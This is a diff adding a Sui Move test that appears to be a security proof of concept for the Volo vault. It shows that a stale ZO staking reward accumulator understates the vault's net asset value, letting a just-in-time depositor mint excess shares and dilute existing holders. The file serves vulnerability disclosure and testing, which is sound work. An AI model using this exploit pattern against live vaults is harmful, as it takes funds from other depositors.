@@ -1,0 +1,240 @@
+// END-TO-END PoC for Volo V-1 — proves the ZO-adaptor stale-accumulator bug THROUGH the vault's
+// share accounting (not just the adaptor reward leg).
+//
+// IN-SCOPE BUG: volo_vault::zo_adaptor::update_zo_position_value writes the ZO position's USD value into
+// the vault using zo_staking::pool::pool_acc_reward_per_share() — the RAW STORED accumulator, which only
+// advances inside the pool's PRIVATE refresh_pool (deposit/withdraw/claim/add_reward). So while the pool
+// is unsettled, the adaptor OMITS all rewards accrued since it was last touched -> the vault's
+// get_total_usd_value (NAV) is understated -> get_share_ratio (= NAV / total_shares) is understated ->
+// a depositor mints MORE shares per USD than fair (dilution of existing holders).
+//
+// This test uses the REAL vault, the REAL zo_adaptor, and a REAL zo_staking pool. It shows:
+//   (1) the vault share ratio is understated while the pool is stale, and JUMPS UP after a permissionless
+//       third-party settle, with the jump = the omitted reward leg; and
+//   (2) a just-in-time depositor B who mints at the stale ratio and is then valued at the settled ratio
+//       captures a deterministic pro-rata accounting gain once the stale-NAV state exists — value
+//       transferred from the pre-existing holder A who accrued the rewards.
+//
+// Run:  sui move test zo_endtoend
+#[test_only]
+module volo_vault::zzz_volo_zo_endtoend_poc {
+    use sui::clock;
+    use sui::coin;
+    use sui::test_scenario::{Self as ts};
+
+    use volo_vault::init_vault;
+    use volo_vault::test_helpers;
+    use volo_vault::sui_test_coin::SUI_TEST_COIN;
+    use volo_vault::usdc_test_coin::USDC_TEST_COIN;
+    use volo_vault::vault::{Vault};
+    use volo_vault::vault_oracle::OracleConfig;
+    use volo_vault::vault_utils;
+    use volo_vault::zo_adaptor;
+
+    use zo_staking::pool::{Self, Pool, CredentialV2};
+    use zo_staking::admin::{Self as zo_admin};
+
+    const OWNER: address = @0xA;        // vault owner / operator
+    const THIRD_PARTY: address = @0xB;  // unprivileged outsider who settles the pool
+
+    const ORACLE_DECIMALS: u256 = 1_000_000_000_000_000_000;
+
+    #[test]
+    fun test_zo_stale_nav_dilutes_vault_shares_end_to_end() {
+        let mut s = ts::begin(OWNER);
+        let mut clock = clock::create_for_testing(s.ctx());
+
+        // --- Vault + oracle + reward manager (real wiring via the repo's own harness) ---
+        init_vault::init_vault(&mut s, &mut clock);
+        init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
+        init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);
+
+        s.next_tx(OWNER);
+        {
+            let mut oracle_config = s.take_shared<OracleConfig>();
+            test_helpers::set_aggregators(&mut s, &mut clock, &mut oracle_config);
+            ts::return_shared(oracle_config);
+        };
+
+        // --- Create a REAL zo_staking pool (Stake = SUI, Reward = USDC) ---
+        let start_time = 1000;          // seconds
+        let end_time = 100_000_000;
+        // reward_rate chosen so one stale hour accrues a realistic ~2% of the staked principal's USD value
+        // (bounded JIT magnitude = elapsed * rate * pool_share, then oracle-priced).
+        let reward_rate: u128 = 6; // reward units / sec
+        let stake_amount: u64 = 1_000_000_000; // operator stakes 1e9 (the vault's ZO principal)
+
+        s.next_tx(OWNER);
+        {
+            let (admin_cap, acl) = zo_admin::new_for_testing(s.ctx());
+            clock::set_for_testing(&mut clock, (start_time - 1) * 1000);
+            pool::create_pool<SUI_TEST_COIN, USDC_TEST_COIN>(
+                &admin_cap, &clock, start_time, end_time, 0, s.ctx(),
+            );
+            // hand both caps to OWNER for the following txs
+            transfer::public_transfer(admin_cap, OWNER);
+            transfer::public_transfer(acl, OWNER);
+        };
+
+        s.next_tx(OWNER);
+        {
+            let admin_cap = s.take_from_sender<zo_admin::AdminCap>();
+            let mut acl = s.take_from_sender<zo_admin::AclControl>();
+            let mut zpool = s.take_shared<Pool<SUI_TEST_COIN, USDC_TEST_COIN>>();
+
+            pool::bump_pool_version(&admin_cap, &mut zpool, s.ctx()); // init version
+
+            // fund rewards + set rate at t = start_time (refreshes once)
+            clock::set_for_testing(&mut clock, start_time * 1000);
+            zo_admin::add_role(&admin_cap, &mut acl, b"operator");
+            zo_admin::add_address_to_role(&admin_cap, &mut acl, b"operator", OWNER);
+            pool::add_reward(&mut zpool, &clock, coin::mint_for_testing<USDC_TEST_COIN>(1_000_000_000_000, s.ctx()), s.ctx());
+            pool::set_reward_rate(&mut acl, b"operator", &mut zpool, &clock, reward_rate, end_time, s.ctx());
+
+            // operator stakes the vault's principal into ZO -> CredentialV2 (deposit refreshes, snapshots acc)
+            clock::set_for_testing(&mut clock, (start_time + 1) * 1000);
+            let cred = pool::deposit_ptb_v2<SUI_TEST_COIN, USDC_TEST_COIN>(
+                &mut zpool, &clock, coin::mint_for_testing<SUI_TEST_COIN>(stake_amount, s.ctx()), s.ctx(),
+            );
+            // vault now holds the ZO position as a defi asset (idx 0)
+            let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
+            vault.add_new_defi_asset(0, cred);
+
+            ts::return_shared(vault);
+            ts::return_shared(zpool);
+            s.return_to_sender(admin_cap);
+            s.return_to_sender(acl);
+        };
+
+        // --- 1 hour passes with NO pool interaction (rewards accrue but accumulator stays stale) ---
+        let elapsed: u64 = 3_600;
+        clock::set_for_testing(&mut clock, (start_time + 1 + elapsed) * 1000);
+
+        // Refresh oracle prices AT the current time so the adaptor's freshness check passes (both evals
+        // happen at this same timestamp; the ZO pool is untouched so its accumulator stays stale).
+        s.next_tx(OWNER);
+        {
+            let mut oracle_config = s.take_shared<OracleConfig>();
+            let prices = vector[1 * ORACLE_DECIMALS, 1 * ORACLE_DECIMALS, 1 * ORACLE_DECIMALS];
+            test_helpers::set_prices(&mut s, &mut clock, &mut oracle_config, prices);
+            ts::return_shared(oracle_config);
+        };
+
+        // --- STALE value: call the REAL adaptor; it reads the stale accumulator (reward leg omitted) ---
+        let asset_type = vault_utils::parse_key<CredentialV2<SUI_TEST_COIN, USDC_TEST_COIN>>(0);
+        let v0: u256;
+        let ratio_stale: u256;
+        let shares_b: u256;
+        let x_deposit: u256;
+        s.next_tx(OWNER);
+        {
+            let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
+            let config = s.take_shared<OracleConfig>();
+            let mut zpool = s.take_shared<Pool<SUI_TEST_COIN, USDC_TEST_COIN>>();
+
+            zo_adaptor::update_zo_position_value<SUI_TEST_COIN, SUI_TEST_COIN, USDC_TEST_COIN>(
+                &mut vault, &config, &clock, asset_type, &mut zpool,
+            );
+            v0 = vault.get_total_usd_value_without_update();
+            // Represent pre-existing holder A owning the whole (stale-valued) vault.
+            vault.set_total_shares(v0);
+            ratio_stale = vault.get_share_ratio_without_update();
+
+            // Just-in-time depositor B deposits X = v0 of value, minting at the STALE ratio.
+            x_deposit = v0;
+            shares_b = vault_utils::div_d(x_deposit, ratio_stale);
+
+            ts::return_shared(vault);
+            ts::return_shared(config);
+            ts::return_shared(zpool);
+        };
+
+        // --- Settle the pool via an UNPRIVILEGED third party's ordinary deposit_v2 (public; refreshes) ---
+        s.next_tx(THIRD_PARTY);
+        {
+            let mut zpool = s.take_shared<Pool<SUI_TEST_COIN, USDC_TEST_COIN>>();
+            pool::deposit_v2<SUI_TEST_COIN, USDC_TEST_COIN>(
+                &mut zpool, &clock, coin::mint_for_testing<SUI_TEST_COIN>(1, s.ctx()), s.ctx(),
+            );
+            ts::return_shared(zpool);
+        };
+
+        // --- SETTLED value: re-run the adaptor; NAV now includes the accrued rewards ---
+        // NOTE: `ratio_settled_a_only` is the settled share ratio while the vault still has A-only shares
+        // (before B is modeled). It proves the ratio JUMP; B's actual capture uses `ratio_after_b_settle`.
+        let v1: u256;
+        let ratio_settled_a_only: u256;
+        let b_value_after: u256;
+        s.next_tx(OWNER);
+        {
+            let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
+            let config = s.take_shared<OracleConfig>();
+            let mut zpool = s.take_shared<Pool<SUI_TEST_COIN, USDC_TEST_COIN>>();
+
+            zo_adaptor::update_zo_position_value<SUI_TEST_COIN, SUI_TEST_COIN, USDC_TEST_COIN>(
+                &mut vault, &config, &clock, asset_type, &mut zpool,
+            );
+            v1 = vault.get_total_usd_value_without_update();
+            ratio_settled_a_only = vault.get_share_ratio_without_update();
+
+            ts::return_shared(vault);
+            ts::return_shared(config);
+            ts::return_shared(zpool);
+        };
+
+        // --- B's PRO-RATA value after settle (B's shares + deposit are in the denominator/NAV) ---
+        // We model the mint with the vault's REAL share-ratio math (div_d/mul_d) rather than calling the
+        // real user_entry::deposit, because the real execute_deposit requires the v1.1 single-vault-operator
+        // pairing that the repo's own test harness never establishes. Crucially, B's minted shares are added
+        // to total_shares and B's deposited cash to NAV before valuation, so B only captures its PRO-RATA
+        // slice of the omitted reward (not the whole leg).
+        let total_shares_after_b = v0 + shares_b;          // A's shares + B's minted shares
+        let total_nav_after_settle = v1 + x_deposit;       // settled ZO NAV + B's deposited cash
+        let ratio_after_b_settle = vault_utils::div_d(total_nav_after_settle, total_shares_after_b);
+        b_value_after = vault_utils::mul_d(shares_b, ratio_after_b_settle);
+        let b_gain = b_value_after - x_deposit;
+        let omitted_reward = v1 - v0;
+
+        // ---------------- L3 OUTCOME ASSERTIONS ----------------
+        std::debug::print(&b"v0 (stale NAV) / v1 (settled NAV) / omitted reward leg:");
+        std::debug::print(&v0);
+        std::debug::print(&v1);
+        std::debug::print(&omitted_reward);
+        std::debug::print(&b"share ratio stale / settled (A-only):");
+        std::debug::print(&ratio_stale);
+        std::debug::print(&ratio_settled_a_only);
+        std::debug::print(&b"B deposited / B value after settle / B PRO-RATA gain:");
+        std::debug::print(&x_deposit);
+        std::debug::print(&b_value_after);
+        std::debug::print(&b_gain);
+
+        // (1) The bug: the vault NAV (and thus share price) was understated while the pool was stale.
+        assert!(v1 > v0, 200);
+        assert!(ratio_settled_a_only > ratio_stale, 201);
+
+        // (2) Dilution capture: B (minting at the stale ratio) gains value the instant the pool settles —
+        //     a deterministic accounting gain once the stale-NAV state exists; no privileged access.
+        assert!(b_value_after > x_deposit, 202);
+        assert!(b_gain > 0, 207);
+
+        // (3) The omitted reward leg is strictly positive, and B's capture is BOUNDED by it (pro-rata),
+        //     never exceeding the full omitted reward (equal deposit -> ~half).
+        assert!(omitted_reward > 0, 203);
+        assert!(b_gain <= omitted_reward, 204);
+
+        // (4) Illustration: a larger B deposit captures a larger fraction of the omitted reward, approaching
+        //     the full leg as B dominates the vault (computed with the same real share-ratio math).
+        let x_big = v0 * 10;
+        let shares_b_big = vault_utils::div_d(x_big, ratio_stale);
+        let ratio_after_big = vault_utils::div_d(v1 + x_big, v0 + shares_b_big);
+        let b_gain_big = vault_utils::mul_d(shares_b_big, ratio_after_big) - x_big;
+        std::debug::print(&b"B(10x) deposit / B(10x) gain (capture approaches full omitted reward):");
+        std::debug::print(&x_big);
+        std::debug::print(&b_gain_big);
+        assert!(b_gain_big > b_gain, 205);
+        assert!(b_gain_big <= omitted_reward, 206);
+
+        clock::destroy_for_testing(clock);
+        s.end();
+    }
+}
